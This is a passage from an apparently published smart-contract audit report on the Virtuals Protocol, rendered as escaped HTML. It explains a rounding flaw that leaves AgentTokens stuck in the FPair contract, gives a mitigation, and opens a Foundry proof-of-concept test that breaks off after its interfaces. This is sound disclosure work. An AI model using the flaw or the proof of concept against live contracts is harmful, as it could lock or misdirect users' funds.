class=\"mtk11\"\u003eexecuteBondingCurveApplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_token\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edecimals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edecimals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWithin \u003ccode\u003eAgentFactoryV3.executeBondingCurveApplication()\u003c/code\u003e, these parameters are used to calculate the vault supply.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentFactoryV3.sol#L466-L480\"\u003eAgentFactoryV3.sol#L466-480\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenSupplyParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencode\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/* vaultSupply */\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evault\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThen, within \u003ccode\u003eAgentToken.initialize()\u003c/code\u003e, the provided numbers will be multiplied by \u003ccode\u003e10 ** 18\u003c/code\u003e. \u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentToken.sol#L95-L96\"\u003eAgentToken.sol#L95-L96\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupplyParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edecimals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evaultSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupplyParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evaultSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edecimals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen \u003ccode\u003elpSupply\u003c/code\u003e is calculated as \u003ccode\u003etokenBalance / (10 ** token_.decimals())\u003c/code\u003e it will truncate any remainder after dividing by 1 ether. Then it will be multiplied by \u003ccode\u003e10 ** token_.decimals()\u003c/code\u003e which results in a value that is smaller than the original \u003ccode\u003elpSupply\u003c/code\u003e. This will result in \u003ccode\u003evaultSupply\u003c/code\u003e being too big and \u003ccode\u003eAgentTokens\u003c/code\u003e being stuck in the \u003ccode\u003eFPair\u003c/code\u003e contract.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRemove the division and then multiplication by \u003ccode\u003e10 ** token_.decimals()\u003c/code\u003e. Simply pass through the full wei value.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-8\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003espender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIBonding\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_name\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_ticker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edesc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurls\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epurchaseAmount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebuy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epayable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBondingRoundingPOC\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan 